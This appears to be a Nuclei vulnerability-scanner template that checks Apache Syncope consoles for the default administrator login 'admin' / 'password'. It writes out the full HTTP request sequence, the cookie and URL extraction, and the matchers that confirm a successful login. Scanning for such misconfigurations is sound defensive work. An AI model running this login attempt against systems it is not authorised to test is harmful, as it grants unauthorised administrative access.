flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: jsessionid
    part: header_1
    regex:
    - 'Set-Cookie: (?<jsessionid>JSESSIONID=\w+);'
    type: regex
  - group: 1
    internal: true
    name: location
    part: header_1
    regex:
    - 'Location: .(?<location>\/login\?\d+)'
    type: regex
  - group: 1
    internal: true
    name: loginsubmit
    part: body_2
    regex:
    - .(?<loginsubmit>\/login\?[0-9]-[0-9].[0-9]-login-submit)
    type: regex
  raw:
  - 'GET /syncope-console/login HTTP/1.1

    Host: {{Hostname}}

    Cookie: JSESSIONID=333333444444AAAA555555556666;

    '
  - 'GET /syncope-console{{location}} HTTP/1.1

    Host: {{Hostname}}

    '
- attack: pitchfork
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - <ajax-response><redirect><![CDATA[.]]></redirect></ajax-response>
    - <ajax-response><redirect><![CDATA[../]]></redirect></ajax-response>
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - password
    username:
    - admin
  raw:
  - 'POST /syncope-console{{loginsubmit}} HTTP/1.1

    Host: {{Hostname}}

    Wicket-Ajax: true

    Wicket-Ajax-BaseURL: {{location}}

    X-Requested-With: XMLHttpRequest

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Origin: {{RootURL}}


    username={{username}}&password={{password}}&language=0&domain=0&p%3A%3Asubmit=1

    '
id: apache-syncope-default-login
info:
  author: icarot
  description: 'The Apache Syncope server is configured with default administrative
    credentials, allowing an attacker to perform unauthorized operations. This template
    verifies the use of the default username admin and password password.

    '
  metadata:
    product: syncope
    vendor: apache
    verified: true
  name: Apache Syncope - Default Login
  reference:
  - https://github.com/apache/syncope
  severity: high
  tags: apache,syncope,default-login
